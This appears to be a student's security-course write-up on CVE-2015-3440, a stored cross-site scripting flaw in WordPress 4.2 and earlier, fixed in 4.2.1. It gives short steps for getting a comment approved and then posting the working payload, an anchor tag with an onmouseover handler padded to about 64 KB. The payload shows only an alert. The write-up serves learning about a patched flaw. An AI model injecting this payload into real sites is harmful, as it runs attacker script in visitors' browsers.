# Steps
#### Step 1 - Gain trust from the admin
######	If you have the ability to post skip to step 3
######	Create a comment on a post.

#### Step 2 - Wait
###### Wait for approval from the admin.

#### Step 3 - Inject XSS
######	Comment the payload.
	<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
 



# The types / classes of vulnerabilities involved and any related CVE identifiers
#### Unauthenticated Stored Cross-Site Scripting (XSS)

#### CVE-2015-3440 



# Affected versions and patches
#### Affected version
###### WordPress <= 4.2 

#### Patched in
###### version 4.2.1



# Demo
![alt text](https://github.com/Mikhail-Kreytser/Cybersecurity-Week7/blob/master/XSS%201/Demo.gif "XSS Demo")

# References
#### https://klikki.fi/adv/wordpress2.html
#### https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3440
